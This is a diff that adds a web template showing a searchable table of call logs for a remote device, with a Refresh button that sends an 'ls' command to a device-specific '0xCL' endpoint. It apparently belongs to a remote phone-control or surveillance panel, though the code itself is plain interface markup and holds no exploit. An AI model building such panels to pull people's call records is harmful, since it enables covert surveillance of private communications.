@@ -1,0 +1,144 @@
+<div class="data-container">
+  <div class="data-controls">
+    <div class="control-bar">
+      <div class="search-box" style="flex: 1; max-width: 400px;">
+        <i class="search icon"></i>
+        <input type="text" id="searchInput" class="form-input" placeholder="Search by phone number or name...">
+      </div>
+      <button class="btn btn-primary" onclick="refreshData()">
+        <i class="refresh icon"></i> Refresh
+      </button>
+    </div>
+  </div>
+
+  <div class="data-table-container">
+    <table class="table">
+      <thead>
+        <tr>
+          <th>Contact Name</th>
+          <th>Phone Number</th>
+          <th>Type</th>
+          <th>Duration</th>
+          <th>Date & Time</th>
+        </tr>
+      </thead>
+      <tbody id="dataTableBody">
+        <% if (pageData && pageData.length > 0) { %>
+          <% pageData.forEach(function(call) { %>
+            <tr>
+              <td><%= call.name || 'Unknown' %></td>
+              <td><%= call.phoneNo || '-' %></td>
+              <td>
+                <span class="call-type <%= 
+                  call.type === 'INCOMING' ? 'incoming' :
+                  call.type === 'OUTGOING' ? 'outgoing' :
+                  'missed'
+                %>">
+                  <%= call.type || 'Unknown' %>
+                </span>
+              </td>
+              <td><%= call.duration ? call.duration + 's' : '-' %></td>
+              <td><%= call.date ? new Date(call.date).toLocaleString() : '-' %></td>
+            </tr>
+          <% }); %>
+        <% } else { %>
+          <tr>
+            <td colspan="5" class="text-center" style="padding: 40px; color: #718096;">
+              <i class="phone icon" style="font-size: 48px; margin-bottom: 16px; display: block; color: #cbd5e0;"></i>
+              No call logs available
+            </td>
+          </tr>
+        <% } %>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<style>
+  .data-container {
+    display: flex;
+    flex-direction: column;
+    gap: 24px;
+  }
+
+  .data-controls {
+    background: white;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+  }
+
+  .control-bar {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+  }
+
+  .search-box {
+    position: relative;
+  }
+
+  .search-box i {
+    position: absolute;
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #a0aec0;
+  }
+
+  .search-box input {
+    padding-left: 45px;
+  }
+
+  .call-type {
+    padding: 4px 12px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+  }
+
+  .call-type.incoming {
+    background: rgba(72, 187, 120, 0.1);
+    color: #48bb78;
+  }
+
+  .call-type.outgoing {
+    background: rgba(66, 153, 225, 0.1);
+    color: #4299e1;
+  }
+
+  .call-type.missed {
+    background: rgba(229, 62, 62, 0.1);
+    color: #e53e3e;
+  }
+</style>
+
+<script>
+  function refreshData() {
+    fetch(`/manage/<%= deviceid %>/0xCL`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'same-origin',
+      body: JSON.stringify({ action: 'ls' })
+    })
+    .then(response => response.json())
+    .then(data => {
+      alert('Request sent to update call logs');
+      setTimeout(() => location.reload(), 2000);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Failed to request call logs update');
+    });
+  }
+
+  document.getElementById('searchInput')?.addEventListener('input', function() {
+    const searchValue = this.value.toLowerCase();
+    const rows = document.querySelectorAll('#dataTableBody tr');
+    rows.forEach(row => {
+      const text = row.textContent.toLowerCase();
+      row.style.display = text.includes(searchValue) ? '' : 'none';
+    });
+  });
+</script>
